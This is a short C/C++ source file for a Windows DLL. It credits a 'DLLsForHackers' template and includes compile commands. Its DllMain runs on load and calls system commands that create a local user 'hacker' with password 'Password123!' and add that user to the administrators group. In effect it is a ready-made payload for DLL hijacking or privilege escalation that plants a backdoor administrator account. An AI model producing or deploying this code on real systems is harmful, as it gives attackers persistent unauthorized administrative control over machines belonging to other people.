#include <stdio.h>
#include <windows.h>

// source:https://github.com/Mr-Un1k0d3r/DLLsForHackers/blob/master/templates/exec.c
// compile: "c:\Program Files\CodeBlocks\MinGW\bin\g++.exe" -Wall -DBUILD_DLL -O2 -c exec_dll-64.c -o output/exec_dll-64.o  && "c:\Program Files\CodeBlocks\MinGW\bin\g++.exe" -shared -Wl,--dll output/exec_dll-64.o -o output/exec_dll-64.dll

#ifdef BUILD_DLL
    #define DLL_EXPORT __declspec(dllexport)
#else
    #define DLL_EXPORT __declspec(dllimport)
#endif

BOOL running = FALSE;

void DLL_EXPORT initCallback()
{
    if(!running) {
      system("cmd.exe /c net user hacker Password123! /add");
      system("cmd.exe /c net localgroup administrators hacker /add");
      running = TRUE;
    }

}

extern "C" DLL_EXPORT BOOL APIENTRY DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    switch (fdwReason)
    {
        case DLL_PROCESS_ATTACH:
                              initCallback();
            break;

        case DLL_PROCESS_DETACH:
                              initCallback();
            break;

        case DLL_THREAD_ATTACH:
                              initCallback();
            break;

        case DLL_THREAD_DETACH:
                              initCallback();
            break;
    }
    return TRUE;
}